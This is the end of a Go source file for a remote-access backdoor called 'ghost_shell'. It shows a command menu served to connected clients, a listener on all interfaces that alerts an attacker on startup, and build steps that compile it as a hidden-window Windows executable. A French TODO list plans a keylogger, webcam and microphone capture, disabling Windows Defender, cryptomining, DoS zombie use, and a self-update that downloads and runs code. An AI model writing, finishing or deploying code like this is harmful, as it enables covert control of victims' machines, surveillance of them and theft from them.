			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "\033[1;31mupdate:\033[0m Update the backdoor")
			fmt.Fprintln(conn, "\033[1;31mhelp:\033[0m Display available commands")
			fmt.Fprintln(conn, "\033[1;31minfo:\033[0m Dispay the description")
			fmt.Fprintln(conn, "\033[1;31mquit:\033[0m Quit the server (But the server will stay awake)")
			fmt.Fprintln(conn, "\033[1;31mstop:\033[0m Stop the server")
			fmt.Fprintln(conn, "________________________________________")
			fmt.Fprintln(conn, "________________________________________")

		default:
			fmt.Fprintln(conn, "Unknown command \n->use [help] for more information")
		}
	}
}

func main() {
	ip := "0.0.0.0" // écoute sur toutes les interfaces
	sendAlert()
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", ip, victimPort))
	if err != nil {
		log.Fatal("Error starting server:", err)
	}
	defer listener.Close()
	log.Printf("Server is listening on %s:%d\n", ip, victimPort)

	// Accepter les connexions entrantes et les gérer en parallèle
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Println("Error accepting connection:", err)
				continue
			}
			go handleConnection(conn)
		}
	}()

	select {}
}

/*

TODO :
		- terminer windefucker (il faut trouver le temps optimal pour que ca marche)
		- reparer le script mouselocker (fait mais pas testé)
		- set_dns ne fonctionne pas encore
		- message ne fonctionne pas encore non plus (reparé mais pas encore testé)

		- coder la fonctionnalité get_screen
		- coder la fonctionnalité get_cam
		- coder la fonctionnalité get_mic
		- coder la fonctionnalité keylogger
		- coder info (fait)

		- ajouter une fonctionnalité qui blackscreen et mute pendant 5 seconde le temps d'executer windefucker (je ne sais pas si c'est possible)

		- virus qui a chaque fois que l'utilisateur ecrit "je suis" remplace la suite par une insulte au moment l'envoyer le message

		- faire en sorte que quand personne n'est connecté l'ordi se transforme en zombie (miner du bitcoin / faire des DOS / utiliser comme vpn ...)

		- ajouter une fonctionnalité de mise a jour qui telecharge le fichier si il y a une mise a jour et qui l'execute (fait mais il faut modifier l'adresse)

		-ajouter une fonctionnalité pour communiquer en tcp avec la victime
		-ajouter une fonctionnalité pour communiquer au micro avec la victime ???

		- BUG : ps sans rien arrete le serveur
		- shell : se fait detecter par windows defender !!! (peut etre utiliser les touches du clavier pour demarer ncat ???)

		- repenser keyboard pour integrer les touches alt, ctrl et win, par exeple win/r applique r avec la touche win pressé

		- shutdown doit forcer l'arret (fait mais pas testé)

		- faire envoyer une alerte au demarage a un serveur de sorte a connaitre l'adresse ip de la victime a chaque fois
		qu'elle demarre son ordi et a chaque changement de l'adresse ip
			* il faut que l'alerte contienne le nom de la victime (user) et son adresse ip

			* utiliser un rasberry pi zero w comme serveur tcp avec trois ports ouverts
			un pour recevoir les alertes et les stocker dans un fichier
			un deuxieme pour envoyer tout ca a l'attaquant.
			un troisieme pour les mises a jours

*/

/*

Dependances :
		1)go mod init ghost_shell
		2)go mod tidy
		3)go get -u github.com/gerifield/keybd_event
		5)go get github.com/gerifield/keybd_event

Compilation :
		GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o gs.exe ghost_shell.go

*/
